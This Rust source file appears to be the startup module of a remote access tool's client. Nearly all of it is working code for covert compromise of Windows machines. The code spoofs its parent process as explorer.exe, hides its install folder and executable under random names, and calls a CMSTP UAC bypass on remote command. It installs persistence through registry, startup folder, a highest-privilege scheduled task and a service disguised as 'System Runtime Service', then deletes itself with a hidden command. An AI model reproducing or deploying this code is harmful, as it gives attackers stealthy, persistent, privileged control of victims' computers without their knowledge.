//! Startup behavior and configuration features.
//!
//! Handles:
//! - Install location normalization
//! - Parent process spoofing (appear as child of explorer.exe)
//! - UAC elevation request
//! - Disclosure/consent dialog
//! - Persistence (registry, startup folder, scheduled task)
//! - Prevent sleep
//! - Auto-uninstall triggers

use crate::config::CONFIG;
use crate::uac;
use wavegate_shared::{DisclosureIcon, ElevationMethod, PersistenceMethod, UninstallTrigger};
use std::path::{Path, PathBuf};
use std::fs;

/// Find explorer.exe PID using toolhelp snapshot.
fn find_explorer_pid() -> Option<u32> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::ToolHelp::*;

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(
                    &entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len())]
                );
                if name.eq_ignore_ascii_case("explorer.exe") {
                    let _ = CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }
                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
        None
    }
}

/// Spawn a process as a child of explorer.exe using PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
/// Falls back to regular CreateProcess if spoofing fails.
fn spawn_as_explorer_child(exe_path: &Path) -> bool {
    use std::ptr;
    use windows::core::PWSTR;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::System::Threading::*;

    unsafe {
        // Find explorer.exe
        let explorer_pid = match find_explorer_pid() {
            Some(pid) => pid,
            None => return spawn_detached(exe_path), // Fallback
        };

        // Open handle to explorer with PROCESS_CREATE_PROCESS
        let explorer_handle = match OpenProcess(PROCESS_CREATE_PROCESS, false, explorer_pid) {
            Ok(h) => h,
            Err(_) => return spawn_detached(exe_path), // Fallback
        };

        // Initialize attribute list - first call to get size
        let mut attr_size: usize = 0;
        let _ = InitializeProcThreadAttributeList(
            None,
            1,
            None,
            &mut attr_size,
        );

        if attr_size == 0 {
            let _ = CloseHandle(explorer_handle);
            return spawn_detached(exe_path);
        }

        let mut attr_list_buf: Vec<u8> = vec![0; attr_size];
        let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_list_buf.as_mut_ptr() as *mut _);

        if InitializeProcThreadAttributeList(Some(attr_list), 1, None, &mut attr_size).is_err() {
            let _ = CloseHandle(explorer_handle);
            return spawn_detached(exe_path);
        }

        // Set parent process attribute
        let mut parent_handle = explorer_handle;
        const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;

        if UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            Some(&mut parent_handle as *mut HANDLE as *mut _),
            std::mem::size_of::<HANDLE>(),
            None,
            None,
        ).is_err() {
            DeleteProcThreadAttributeList(attr_list);
            let _ = CloseHandle(explorer_handle);
            return spawn_detached(exe_path);
        }

        // Prepare command line (must be mutable for CreateProcessW)
        let exe_path_str = exe_path.to_string_lossy();
        let mut cmd_line: Vec<u16> = format!("\"{}\"", exe_path_str)
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        // Setup STARTUPINFOEXW
        let mut startup_info = STARTUPINFOEXW {
            StartupInfo: STARTUPINFOW {
                cb: std::mem::size_of::<STARTUPINFOEXW>() as u32,
                ..Default::default()
            },
            lpAttributeList: attr_list,
        };

        let mut process_info = PROCESS_INFORMATION::default();

        let result = CreateProcessW(
            None,
            Some(PWSTR(cmd_line.as_mut_ptr())),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
            None,
            None,
            &startup_info.StartupInfo,
            &mut process_info,
        );

        // Cleanup
        DeleteProcThreadAttributeList(attr_list);
        let _ = CloseHandle(explorer_handle);

        if result.is_ok() {
            let _ = CloseHandle(process_info.hProcess);
            let _ = CloseHandle(process_info.hThread);
            true
        } else {
            spawn_detached(exe_path) // Fallback
        }
    }
}

/// Fallback: spawn process detached without parent spoofing.
fn spawn_detached(exe_path: &Path) -> bool {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    const DETACHED_PROCESS: u32 = 0x00000008;

    std::process::Command::new(exe_path)
        .creation_flags(CREATE_NO_WINDOW | DETACHED_PROCESS)
        .spawn()
        .is_ok()
}

/// Get the standard install directory path.
/// Returns: %LOCALAPPDATA%\{derived_folder_name}\
/// Folder name is derived from machine GUID for consistency without referencing product name.
fn get_install_dir() -> Option<PathBuf> {
    let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
    let folder_name = derive_install_folder_name()?;
    Some(PathBuf::from(local_app_data).join(folder_name))
}

/// Derive a consistent but random-looking folder name from machine GUID.
fn derive_install_folder_name() -> Option<String> {
    use winreg::enums::*;
    use winreg::RegKey;

    // Read Windows MachineGuid
    let machine_guid = RegKey::predef(HKEY_LOCAL_MACHINE)
        .open_subkey(r"SOFTWARE\Microsoft\Cryptography")
        .and_then(|key| key.get_value::<String, _>("MachineGuid"))
        .ok()?;

    // Hash it to create a consistent folder name
    let hash = simple_hash(&machine_guid);

    // Convert to alphanumeric string (8 chars)
    let chars: String = (0..8)
        .map(|i| {
            let byte = ((hash >> (i * 8)) & 0xFF) as u8;
            let idx = (byte % 36) as usize;
            if idx < 10 {
                (b'0' + idx as u8) as char
            } else {
                (b'a' + (idx - 10) as u8) as char
            }
        })
        .collect();

    Some(chars)
}

/// Simple FNV-1a hash
fn simple_hash(s: &str) -> u64 {
    let mut hash: u64 = 0xcbf29ce484222325;
    for byte in s.bytes() {
        hash ^= byte as u64;
        hash = hash.wrapping_mul(0x100000001b3);
    }
    hash
}

/// Generate a random executable name (random length 3-10, alphanumeric).
fn generate_random_exe_name() -> String {
    let length = fastrand::usize(3..=10);
    let chars: String = (0..length)
        .map(|_| {
            let idx = fastrand::usize(0..36);
            if idx < 10 {
                (b'0' + idx as u8) as char
            } else {
                (b'a' + (idx - 10) as u8) as char
            }
        })
        .collect();
    format!("{}.exe", chars)
}

/// Check if we're running from the standard install directory.
fn is_installed_location() -> bool {
    let current_exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };

    let install_dir = match get_install_dir() {
        Some(p) => p,
        None => return false,
    };

    // Check if current exe's parent directory matches install directory
    let current_dir = match current_exe.parent() {
        Some(p) => p,
        None => return false,
    };

    // Canonicalize both for accurate comparison
    let current = current_dir.canonicalize().unwrap_or(current_dir.to_path_buf());
    let expected = install_dir.canonicalize().unwrap_or(install_dir);

    current == expected
}

/// Ensure we're running from the standard install location.
/// If not, copies self to install location with a random name and re-executes.
/// Returns true if we should continue, false if we re-launched from install location.
pub fn ensure_installed_location() -> bool {
    // Already in the right place
    if is_installed_location() {
        return true;
    }

    let current_exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return true, // Can't determine, just continue
    };

    let install_dir = match get_install_dir() {
        Some(p) => p,
        None => return true,
    };

    // Create install directory if needed
    if fs::create_dir_all(&install_dir).is_err() {
        return true; // Can't create dir, continue from current location
    }

    // Check if there's already an exe in the install directory
    let existing_exe = fs::read_dir(&install_dir)
        .ok()
        .and_then(|entries| {
            entries
                .filter_map(|e| e.ok())
                .find(|e| {
                    e.path()
                        .extension()
                        .map(|ext| ext.eq_ignore_ascii_case("exe"))
                        .unwrap_or(false)
                })
                .map(|e| e.path())
        });

    let install_path = if let Some(existing) = existing_exe {
        // Reuse existing exe path (update it with current version)
        if fs::copy(&current_exe, &existing).is_err() {
            return true;
        }
        existing
    } else {
        // Generate random name for new install
        let exe_name = generate_random_exe_name();
        let install_path = install_dir.join(&exe_name);

        if fs::copy(&current_exe, &install_path).is_err() {
            return true;
        }
        install_path
    };

    // Launch from install location as child of explorer.exe
    spawn_as_explorer_child(&install_path);

    // Exit this instance
    false
}

/// Check if running as admin and request elevation if configured.
/// Returns true if we should continue, false if we re-launched elevated.
pub fn check_elevation() -> bool {
    if !CONFIG.request_elevation {
        return true;
    }

    // Check if already elevated
    if is_elevated() {
        return true;
    }

    // Not elevated, try to relaunch based on configured method
    match CONFIG.elevation_method {
        ElevationMethod::Request => {
            request_elevation();
        }
        ElevationMethod::Auto => {
            if !uac::auto_elevate() {
                // Fallback to standard UAC if auto-elevation fails
                request_elevation();
            }
        }
    }

    // If we get here, elevation was initiated - exit this instance
    false
}

/// Force elevation using CMSTP bypass (called remotely by server).
/// Returns true if elevation was initiated successfully.
pub fn force_elevate() -> bool {
    if is_elevated() {
        return true; // Already elevated
    }

    uac::auto_elevate()
}

/// Check if current process is running elevated (admin)
pub fn is_elevated() -> bool {
    use windows::Win32::Foundation::{HANDLE, CloseHandle};
    use windows::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    unsafe {
        let mut token_handle = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle).is_err() {
            return false;
        }

        let mut elevation = TOKEN_ELEVATION::default();
        let mut return_length = 0u32;

        let result = GetTokenInformation(
            token_handle,
            TokenElevation,
            Some(&mut elevation as *mut _ as *mut _),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut return_length,
        );

        let _ = CloseHandle(token_handle);

        result.is_ok() && elevation.TokenIsElevated != 0
    }
}

/// Request UAC elevation by re-launching self with "runas"
fn request_elevation() {
    use std::os::windows::ffi::OsStrExt;
    use windows::core::PCWSTR;
    use windows::Win32::UI::Shell::ShellExecuteW;
    use windows::Win32::UI::WindowsAndMessaging::SW_SHOWNORMAL;

    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };

    let exe_path_wide: Vec<u16> = exe_path.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
    let runas: Vec<u16> = "runas".encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        ShellExecuteW(
            None,
            PCWSTR(runas.as_ptr()),
            PCWSTR(exe_path_wide.as_ptr()),
            PCWSTR::null(),
            PCWSTR::null(),
            SW_SHOWNORMAL,
        );
    }
}

/// Show the disclosure dialog if configured.
/// Returns true if user accepted (or dialog disabled), false if declined.
pub fn show_disclosure_dialog() -> bool {
    if !CONFIG.disclosure.enabled {
        return true;
    }

    show_disclosure_dialog_windows()
}

fn show_disclosure_dialog_windows() -> bool {
    use windows::core::PCWSTR;
    use windows::Win32::UI::WindowsAndMessaging::{
        MessageBoxW, MB_ICONINFORMATION, MB_ICONWARNING, MB_ICONQUESTION,
        MB_OKCANCEL, IDOK, IDYES, MESSAGEBOX_STYLE,
    };

    let title: Vec<u16> = CONFIG.disclosure.title
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    let message: Vec<u16> = CONFIG.disclosure.message
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    let icon_style: MESSAGEBOX_STYLE = match CONFIG.disclosure.icon {
        DisclosureIcon::Information => MB_ICONINFORMATION,
        DisclosureIcon::Warning => MB_ICONWARNING,
        DisclosureIcon::Shield => MB_ICONQUESTION, // Shield uses question icon
        DisclosureIcon::Custom => MB_ICONINFORMATION,
    };

    let result = unsafe {
        MessageBoxW(
            None,
            PCWSTR(message.as_ptr()),
            PCWSTR(title.as_ptr()),
            MB_OKCANCEL | icon_style,
        )
    };

    result == IDOK || result == IDYES
}

/// Install persistence based on configured method.
/// Should be called after successful first connection.
pub fn install_persistence() {
    if !CONFIG.run_on_startup {
        return;
    }

    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };

    match CONFIG.persistence_method {
            PersistenceMethod::RegistryAutorun => {
                install_registry_persistence(&exe_path);
            }
            PersistenceMethod::StartupFolder => {
                install_startup_folder_persistence(&exe_path);
            }
            PersistenceMethod::ScheduledTask => {
                install_scheduled_task_persistence(&exe_path);
            }
            PersistenceMethod::ServiceInstallation => {
                install_service_persistence(&exe_path);
            }
        }
}

/// Create a .lnk shortcut file pointing to the target executable.
/// Returns the path to the created shortcut, or None on failure.
fn create_shortcut(target_exe: &Path, shortcut_path: &Path) -> Option<PathBuf> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows::core::{Interface, PCWSTR};
    use windows::Win32::System::Com::{
        CoCreateInstance, CoInitializeEx, CoUninitialize,
        CLSCTX_INPROC_SERVER, COINIT_APARTMENTTHREADED,
    };
    use windows::Win32::UI::Shell::{IShellLinkW, ShellLink};
    use windows::Win32::System::Com::IPersistFile;

    fn to_wide(s: &OsStr) -> Vec<u16> {
        s.encode_wide().chain(std::iter::once(0)).collect()
    }

    unsafe {
        // Initialize COM
        let _ = CoInitializeEx(None, COINIT_APARTMENTTHREADED);

        // Create ShellLink instance
        let shell_link: IShellLinkW = match CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER) {
            Ok(sl) => sl,
            Err(_) => {
                CoUninitialize();
                return None;
            }
        };

        // Set target path
        let target_wide = to_wide(target_exe.as_os_str());
        if shell_link.SetPath(PCWSTR(target_wide.as_ptr())).is_err() {
            CoUninitialize();
            return None;
        }

        // Set working directory to exe's parent
        if let Some(parent) = target_exe.parent() {
            let parent_wide = to_wide(parent.as_os_str());
            let _ = shell_link.SetWorkingDirectory(PCWSTR(parent_wide.as_ptr()));
        }

        // Save the shortcut via IPersistFile
        let persist_file: IPersistFile = match shell_link.cast() {
            Ok(pf) => pf,
            Err(_) => {
                CoUninitialize();
                return None;
            }
        };

        let shortcut_wide = to_wide(shortcut_path.as_os_str());
        let result = persist_file.Save(PCWSTR(shortcut_wide.as_ptr()), true);

        CoUninitialize();

        if result.is_ok() {
            Some(shortcut_path.to_path_buf())
        } else {
            None
        }
    }
}

/// Get or create the shortcut in the install directory.
/// Returns the path to the .lnk file.
fn get_or_create_shortcut(exe_path: &Path) -> Option<PathBuf> {
    let install_dir = get_install_dir()?;
    let shortcut_path = install_dir.join(format!("{}.lnk", CONFIG.mutex_name));

    // Check if shortcut already exists and points to correct target
    if shortcut_path.exists() {
        return Some(shortcut_path);
    }

    // Create new shortcut
    create_shortcut(exe_path, &shortcut_path)
}

fn install_registry_persistence(exe_path: &PathBuf) {
    use winreg::enums::*;
    use winreg::RegKey;

    // Create shortcut and reference that instead of exe directly
    let target_path = get_or_create_shortcut(exe_path)
        .unwrap_or_else(|| exe_path.clone());

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = r"Software\Microsoft\Windows\CurrentVersion\Run";

    if let Ok(key) = hkcu.open_subkey_with_flags(path, KEY_WRITE) {
        let path_str = target_path.to_string_lossy();
        let _ = key.set_value(&CONFIG.mutex_name, &path_str.as_ref());
    }
}

fn install_startup_folder_persistence(exe_path: &PathBuf) {
    // Get startup folder path for the .lnk
    let startup_lnk = match std::env::var("APPDATA") {
        Ok(appdata) => {
            PathBuf::from(appdata)
                .join(r"Microsoft\Windows\Start Menu\Programs\Startup")
                .join(format!("{}.lnk", CONFIG.mutex_name))
        }
        Err(_) => return,
    };

    // Create shortcut directly in startup folder
    let _ = create_shortcut(exe_path, &startup_lnk);
}

fn install_scheduled_task_persistence(exe_path: &PathBuf) {
    // Create shortcut and reference that instead of exe directly
    let target_path = get_or_create_shortcut(exe_path)
        .unwrap_or_else(|| exe_path.clone());

    let path_str = target_path.to_string_lossy();

    let _ = std::process::Command::new("schtasks")
        .args([
            "/Create",
            "/TN", &CONFIG.mutex_name,
            "/TR", &path_str,
            "/SC", "ONLOGON",
            "/RL", "HIGHEST",
            "/F",
        ])
        .output();
}

fn install_service_persistence(exe_path: &PathBuf) {
    // Create shortcut and reference that instead of exe directly
    let target_path = get_or_create_shortcut(exe_path)
        .unwrap_or_else(|| exe_path.clone());

    let path_str = target_path.to_string_lossy();

    // Create the service using sc.exe
    let _ = std::process::Command::new("sc")
        .args([
            "create",
            &CONFIG.mutex_name,
            &format!("binPath= \"{}\"", path_str),
            "start=", "auto",
            "type=", "own",
        ])
        .output();

    // Set service description (optional, makes it look more legitimate)
    let _ = std::process::Command::new("sc")
        .args([
            "description",
            &CONFIG.mutex_name,
            "System Runtime Service",
        ])
        .output();

    // Start the service
    let _ = std::process::Command::new("sc")
        .args(["start", &CONFIG.mutex_name])
        .output();
}

/// Remove persistence (for uninstall).
pub fn remove_persistence() {
    use winreg::enums::*;
    use winreg::RegKey;

    // Remove registry entry
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = r"Software\Microsoft\Windows\CurrentVersion\Run";

    if let Ok(key) = hkcu.open_subkey_with_flags(path, KEY_WRITE) {
        let _ = key.delete_value(&CONFIG.mutex_name);
    }

    // Remove startup folder .lnk (and legacy .bat if exists)
    if let Ok(appdata) = std::env::var("APPDATA") {
        let startup_dir = PathBuf::from(appdata)
            .join(r"Microsoft\Windows\Start Menu\Programs\Startup");

        let lnk_path = startup_dir.join(format!("{}.lnk", CONFIG.mutex_name));
        let _ = std::fs::remove_file(lnk_path);

        // Also remove legacy .bat file if it exists
        let bat_path = startup_dir.join(format!("{}.bat", CONFIG.mutex_name));
        let _ = std::fs::remove_file(bat_path);
    }

    // Remove shortcut from install directory
    if let Some(install_dir) = get_install_dir() {
        let shortcut_path = install_dir.join(format!("{}.lnk", CONFIG.mutex_name));
        let _ = std::fs::remove_file(shortcut_path);
    }

    // Remove scheduled task
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        let _ = std::process::Command::new("schtasks")
            .args(["/Delete", "/TN", &CONFIG.mutex_name, "/F"])
            .creation_flags(CREATE_NO_WINDOW)
            .output();

        // Remove service (stop first, then delete)
        let _ = std::process::Command::new("sc")
            .args(["stop", &CONFIG.mutex_name])
            .creation_flags(CREATE_NO_WINDOW)
            .output();
        let _ = std::process::Command::new("sc")
            .args(["delete", &CONFIG.mutex_name])
            .creation_flags(CREATE_NO_WINDOW)
            .output();
    }
}

/// Enable prevent sleep mode.
pub fn enable_prevent_sleep() {
    if !CONFIG.prevent_sleep {
        return;
    }

    use windows::Win32::System::Power::{
        SetThreadExecutionState, ES_CONTINUOUS, ES_SYSTEM_REQUIRED, ES_DISPLAY_REQUIRED,
    };

    unsafe {
        SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED);
    }
}

/// Disable prevent sleep mode.
#[allow(dead_code)]
pub fn disable_prevent_sleep() {
    use windows::Win32::System::Power::{SetThreadExecutionState, ES_CONTINUOUS};

    unsafe {
        SetThreadExecutionState(ES_CONTINUOUS);
    }
}

/// Check if any uninstall trigger condition is met.
/// Returns true if the client should uninstall itself.
pub fn check_uninstall_triggers() -> bool {
    match &CONFIG.uninstall_trigger {
        UninstallTrigger::None => false,

        UninstallTrigger::DateTime { datetime } => {
            check_datetime_trigger(datetime)
        }

        UninstallTrigger::NoContact { minutes: _ } => {
            // This needs to be checked during runtime, not at startup
            // The main loop should track last contact time
            false
        }

        UninstallTrigger::SpecificUser { username } => {
            let current_user = whoami::username().to_lowercase();
            current_user == username.to_lowercase()
        }

        UninstallTrigger::SpecificHostname { hostname } => {
            if let Ok(current_hostname) = hostname::get() {
                current_hostname.to_string_lossy().to_lowercase() == hostname.to_lowercase()
            } else {
                false
            }
        }
    }
}

fn check_datetime_trigger(datetime: &str) -> bool {
    use time::{OffsetDateTime, PrimitiveDateTime, format_description};

    // Try to parse as RFC3339
    if let Ok(trigger_time) = OffsetDateTime::parse(datetime, &time::format_description::well_known::Rfc3339) {
        let now = OffsetDateTime::now_utc();
        return now >= trigger_time;
    }

    // Also try parsing as local datetime without timezone (YYYY-MM-DDTHH:MM)
    if let Ok(format) = format_description::parse("[year]-[month]-[day]T[hour]:[minute]") {
        if let Ok(trigger_time) = PrimitiveDateTime::parse(datetime, &format) {
            if let Ok(now) = OffsetDateTime::now_local() {
                let now_primitive = PrimitiveDateTime::new(now.date(), now.time());
                return now_primitive >= trigger_time;
            }
        }
    }

    false
}

/// Perform self-uninstall.
pub fn perform_uninstall() {
    // Remove persistence entries
    remove_persistence();

    // Get our executable path and install directory
    let exe_path = std::env::current_exe().ok();
    let install_dir = get_install_dir();

    if let Some(exe_path) = exe_path {
        let exe_path_str = exe_path.to_string_lossy().to_string();

        // Build cleanup command - delete exe, then try to remove install directory
        // ping localhost adds ~2 second delay, enough for process to exit
        // CREATE_NO_WINDOW flag ensures cmd.exe runs completely hidden
        let cmd_args = if let Some(ref dir) = install_dir {
            let dir_str = dir.to_string_lossy();
            format!(
                "cmd.exe /c ping 127.0.0.1 -n 3 >nul 2>&1 & del /f /q \"{}\" >nul 2>&1 & rmdir /q \"{}\" >nul 2>&1",
                exe_path_str, dir_str
            )
        } else {
            format!(
                "cmd.exe /c ping 127.0.0.1 -n 3 >nul 2>&1 & del /f /q \"{}\" >nul 2>&1",
                exe_path_str
            )
        };

        // Use CreateProcessW directly to ensure no window
        use windows::core::PWSTR;
        use windows::Win32::System::Threading::*;
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;

        unsafe {
            let mut cmd_line: Vec<u16> = cmd_args
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            let startup_info = STARTUPINFOW {
                cb: std::mem::size_of::<STARTUPINFOW>() as u32,
                dwFlags: STARTF_USESHOWWINDOW,
                wShowWindow: SW_HIDE.0 as u16,
                ..Default::default()
            };

            let mut process_info = PROCESS_INFORMATION::default();

            if CreateProcessW(
                None,
                Some(PWSTR(cmd_line.as_mut_ptr())),
                None,
                None,
                false,
                CREATE_NO_WINDOW,
                None,
                None,
                &startup_info,
                &mut process_info,
            ).is_ok() {
                let _ = CloseHandle(process_info.hProcess);
                let _ = CloseHandle(process_info.hThread);
            }
        }
    }

    // Exit the process
    std::process::exit(0);
}

/// Track last server contact time for NoContact uninstall trigger.
static LAST_CONTACT: once_cell::sync::OnceCell<parking_lot::Mutex<std::time::Instant>> =
    once_cell::sync::OnceCell::new();

/// Update the last contact timestamp.
pub fn update_last_contact() {
    let mutex = LAST_CONTACT.get_or_init(|| {
        parking_lot::Mutex::new(std::time::Instant::now())
    });
    *mutex.lock() = std::time::Instant::now();
}

/// Check if NoContact trigger should fire.
pub fn check_no_contact_trigger() -> bool {
    if let UninstallTrigger::NoContact { minutes } = &CONFIG.uninstall_trigger {
        if let Some(mutex) = LAST_CONTACT.get() {
            let last = mutex.lock();
            let elapsed = last.elapsed();
            return elapsed.as_secs() >= (*minutes as u64 * 60);
        }
    }
    false
}
